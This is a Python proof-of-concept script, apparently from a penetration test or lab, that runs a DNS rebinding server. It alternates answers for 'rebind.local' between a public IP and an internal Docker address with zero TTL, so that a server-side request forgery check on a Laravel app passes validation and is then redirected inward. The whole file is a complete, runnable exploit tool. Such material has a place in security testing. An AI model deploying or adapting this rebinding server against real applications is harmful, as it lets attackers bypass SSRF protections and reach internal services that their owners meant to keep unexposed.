#!/usr/bin/env python3
"""
DNS Rebinding SSRF PoC
Demonstrates TOCTOU vulnerability by alternating DNS responses
"""

from dnslib import DNSRecord, DNSHeader, RR, A, QTYPE
from dnslib.server import DNSServer, BaseResolver
import socketserver
import time

class RebindingResolver(BaseResolver):
    """
    Alternates DNS responses between safe and malicious IPs
    """
    def __init__(self):
        self.query_count = 0
        self.safe_ip = "93.184.216.34"      # example.com (safe external IP)
        self.malicious_ip = "172.18.0.2"    # Internal Docker IP (Laravel app)

    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname)
        qtype = QTYPE[request.q.qtype]

        # Only handle A records for our rebind domain
        if qtype == "A" and qname.startswith("rebind.local"):
            self.query_count += 1

            # Alternate between safe and malicious IPs
            if self.query_count % 2 == 1:
                # ODD queries: Return SAFE IP (pass validation)
                ip = self.safe_ip
                status = "✅ SAFE (External)"
            else:
                # EVEN queries: Return MALICIOUS IP (exploit!)
                ip = self.malicious_ip
                status = "⚠️  REBIND (Internal!)"

            # Add DNS record
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(ip), ttl=0))

            # Log the query
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            print(f"[{timestamp}] [Query #{self.query_count}] {qname} -> {ip} {status}")

        return reply

if __name__ == "__main__":
    print("=" * 60)
    print("  DNS Rebinding Server - SSRF PoC")
    print("=" * 60)
    print()
    print("Domain: rebind.local")
    print(f"Safe IP: 93.184.216.34 (external)")
    print(f"Malicious IP: 172.18.0.2 (internal Docker app)")
    print()
    print("Pattern:")
    print("  Query #1 -> 93.184.216.34 (SAFE - passes validation)")
    print("  Query #2 -> 172.18.0.2 (REBIND - exploits TOCTOU!)")
    print("  Query #3 -> 93.184.216.34 (SAFE)")
    print("  Query #4 -> 172.18.0.2 (REBIND)")
    print("  ...")
    print()
    print("Listening on 0.0.0.0:53 (UDP)")
    print("=" * 60)
    print()

    resolver = RebindingResolver()
    server = DNSServer(resolver, port=53, address="0.0.0.0")

    try:
        server.start_thread()
        print("[*] DNS server started. Press Ctrl+C to stop.\n")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down DNS server...")
        server.stop()
